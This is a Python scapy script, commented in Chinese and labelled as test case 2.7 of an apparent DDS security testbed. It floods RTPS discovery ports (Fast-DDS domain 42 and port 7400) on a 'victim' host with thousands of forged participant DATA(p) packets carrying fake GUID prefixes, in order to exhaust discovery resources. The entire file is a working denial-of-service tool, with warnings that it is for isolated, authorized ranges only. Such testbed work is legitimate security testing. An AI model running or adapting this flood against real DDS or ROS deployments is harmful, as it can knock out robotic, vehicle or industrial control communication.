#!/usr/bin/env python3
"""
測試案例 2.7：RTPS Discovery Flood（偽造 participant 洪水）

目的：以 scapy 對 DDS 探索埠灌入大量偽造 RTPS DATA(p) 封包，
      測試靶場探索機制在垃圾 participant 洪水下的資源消耗 / 穩定性。
預期結果（未加固）：victim 探索埠收到大量封包，participant 表膨脹或 CPU 上升。
成功判定：victim 端 tshark 觀察到來自偽造來源的大量 RTPS 流量。

注意：僅在隔離網段對授權靶場執行。目標 IP 預設為 victim 固定 IP。

用法（attacker 容器內，需 NET_RAW）：
    python3 /work/attacks/dos_rtps_flood.py [目標IP] [封包數]
"""
import sys
from scapy.all import IP, UDP, Raw, send

# 從真實 RTPS DATA(p) 擷取的最小化 payload 骨架（RTPS header + 探索子訊息）
# 這裡用一個合法 RTPS magic 開頭，內容為佔位，目的在製造探索埠負載。
RTPS_MAGIC = b'RTPS'
RTPS_VERSION = b'\x02\x04'      # v2.4
VENDOR = b'\x01\x03'           # eProsima
GUID_PREFIX = b'\xde\xad\xbe\xef' * 3  # 偽造 GUID prefix


def build_payload(i):
    # 每個封包用不同 GUID prefix 尾碼，模擬「大量不同 participant」
    guid = (b'\xde\xad\xbe\xef' * 2) + i.to_bytes(4, 'big')
    return RTPS_MAGIC + RTPS_VERSION + VENDOR + guid + (b'\x00' * 200)


def main():
    target = sys.argv[1] if len(sys.argv) > 1 else '172.30.0.10'
    count = int(sys.argv[2]) if len(sys.argv) > 2 else 5000
    dport = 7400  # Fast-DDS 預設 metatraffic multicast 埠 (domain 0 base)；domain42 另計，這裡打探索基埠範圍

    print(f'=== [2.7] RTPS Discovery Flood -> {target} x{count} ===')
    print('僅限隔離網段 / 授權靶場。')

    # 針對 domain 42 的 metatraffic unicast 埠範圍掃射
    # Fast-DDS: port = 7400 + 250*domainId + offset ；此處對常見探索埠灑封包
    base = 7400 + 250 * 42
    ports = [base, base + 1, base + 10, base + 11, 7400]
    for i in range(count):
        p = ports[i % len(ports)]
        pkt = IP(dst=target) / UDP(sport=40000 + (i % 20000), dport=p) / Raw(build_payload(i))
        send(pkt, verbose=False)
        if (i + 1) % 500 == 0:
            print(f'已送 {i + 1}/{count}')
    print('完成。請於 victim/monitor 觀察 tshark 流量與 CPU。')


if __name__ == '__main__':
    main()
